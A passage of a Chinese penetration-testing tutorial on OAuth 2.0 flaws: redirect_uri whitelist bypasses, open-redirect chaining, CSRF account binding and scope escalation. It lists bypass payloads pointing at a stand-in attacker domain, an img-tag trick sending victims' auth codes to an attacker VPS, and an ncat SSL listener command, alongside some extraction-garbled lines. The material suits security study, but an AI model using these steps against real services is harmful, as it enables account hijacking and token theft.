第⼆种情况：回调 URL 校验绕过
部分 OAuth 提供⽅在进⾏的回调 URL 校验后存在被绕
过的情况。
此种漏洞类型也是如今最为常⻅的类型。以某个授权⻚⾯
所示：
https://xxx.com/ authorize?response_
type=code&client_
id=ArOUCNpMvP&redirect_uri=https://xxx.com/app/
token&state=xxx.com&scope=all
直接修改 redirect_uri 参数发送请求，发现进⾏⽩名单校
验。
对 redirect_uri 参数进⾏ Fuzz。
使⽤这个值即可绕过⽩名单限制:
http://gh0st.cn:80#@xxx.com/，返回授权⻚⾯正常。
下⾯是⼀些常⽤的 bypass ⽅式：
///www.gh0st.com//..
///www.gh0st.com//../
/https:/gh0st.com/
//www.gh0st.com//..
//www.gh0st.com
/www.gh0st.com
https://www.xxx.com/www.gh0st.com
//gh0st.com
http://www.xxx.com.gh0st.com
http://gh0st.cn:80#@xxx.com
http://PI:EMAIL
http://www.xxx.com#gh0st.com
http://www.xxx.com?gh0st.com
http://www.xxx.comgh0st.com
http://www.xxx.comgh0st.com
p g
第三种情况：利⽤ URL 跳转漏洞
这其实也属于校验不完整的⽽绕过的⼀种情况，因为
OAuth 提供⽅只对回调 URL 的根域等进⾏了校验，当回
调的 URL 根域确实是原正常回调 URL 的根域，但实际
是该域下的⼀个存在 URL 跳转漏洞的 URL，就可以构造
跳转到钓⻥⻚⾯，就可以绕过回调 URL 的校验了。由于
此种⽅式只需要再结合⼀处 URL 跳转漏洞即可实现，暂
不做案例演示。
第四种情况：结合跨站图⽚
通过在客户端或者客户端⼦域的公共评论区等模块，插⼊
构造好请求的 img 标签，将 redirect_uri 参数修改为加
构造好 img 标签的 URL，利⽤本身的域名去绕过⽩名单
限制。
如下图所示，在评出处填写，此时当有⽤户访问这个⻚⾯
时就会请求我们的 vps 服务器。
退出登录，进⼊登录⻚⾯，点击⽀付宝快速登录。
复制 URL 链接，修改 redirect_uri 参数为我们刚才评论
的地址 (要⽤两次 url 编码)
的地址 (要⽤两次 url 编码)。
原 url：
https://auth.alipay.com/login/index.htm?
goto=https://xxx.com:443/oauth2/publicAppAuthoriz
e.htm?app_id=20190&redirect_uri=https://xxx.com/?
login/bind/alipay/callback?
token=oN7Jvtq7M&scope=auth_user
两次 url 编码：
https%253a//auth.alipay.com/login/index.htm%253f
goto%253dhttps%253a//xxx.com%253a443/oauth2
/publicAppAuthorize.htm%253fapp_id%253d20190%
2526redirect_uri%253dhttps%253a//xxx.com/%253
flogin/bind/alipay/callback%253ftoken%253doN7Jvt
q7M%2526scope%253dauth_user
在 VPS 上⽣成证书，然后监听 1234 端⼝
openssl req -x509 -newkey rsa:2048 -keyout
key.pem -out cert.pem -days 365 -nodes
apt install nmap
ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -
lvnp 1234
将修改好的 URL 链接发给普通⽤户，⼀旦他们点击登
录，攻击者就能拿到他们的 auth_code。
2.CSRF 绑定劫持漏洞
攻击者抓取认证请求构造恶意 url, 并诱骗已经登录的⽹
⽤户点击 (⽐如通过邮件或者 QQ 等⽅式)。认证成功后
⽤户的帐号会同攻击者的帐号绑定到⼀起。
如某云的历史漏洞 2014-060493，某⼚商的 OAuth 2.0
认证流程中，当攻击者发起⼀个认证请求：
https://api.weibo.com/oauth2/authorize?
client_id=**&redirect_uri=http%3A%2F%2Fwww.xxx.
cn%2Fconnect_sync%2Fsina_v2_sync.php&response
_type=code
并截获 OAuth 2.0 认证请求的返回。
http://www.xxx.cn/connect_sync/sina_v2_sync.php?
code=6e20eb6bfea2d969a8fa5435a5d106d5
然后攻击者诱骗已经登录的⽹⽤户点击。此⼚商会⾃动将
⽤户的帐号同攻击者的帐号绑定到⼀起。此后攻击者便可
以 过其新浪帐 访问 害 户的帐
以通过其新浪帐号访问受害⽤户的帐号。
OAuth 2.0 提供了 state 参数⽤于防御 CSRF. 认证服务
器在接收到的 state 参数按原样返回给 redirect_uri, 客
户端收到该参数并验证与之前⽣成的值是否⼀致. 所以此
漏洞适⽤于未配置 state 参数授权的认证⽅式。
3.Scope 越权访问
这个案例展示了 scope 权限控制不当带来的安全⻛险,
同时将授权劫持的⼏个⽅⾯演绎的淋漓尽致。
案例: https://www.oschina.net/question/12_143105
https://github.com/login/oauth/authorize?
client_id=7e0a3cd836d3e544dbd9&redirect_uri=http
s%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%2
Fcallback/../../../homakov/8820324&response_type=
code&scope=repo,gists,user,delete_repo,notifications
上⾯案例中的 scope 参数扩⼤到了⽤户的代码库等其它
权限。于是越权拥有了⽤户的私有代码区操作权限。
总结
在我们⽇常的渗透测试以及学习研究过程中，不仅仅要拓
展对常规漏洞 (owasp top10) 的研究深度，也应该拓展
漏洞的宽度，毕竟你的知识⾯直接决定了你的攻击⾯。
全⽂完
本⽂由 简悦 SimpRead 优化，⽤以提升阅读体验
使⽤了 全新的简悦词法分析引擎 beta，点击查看详细说明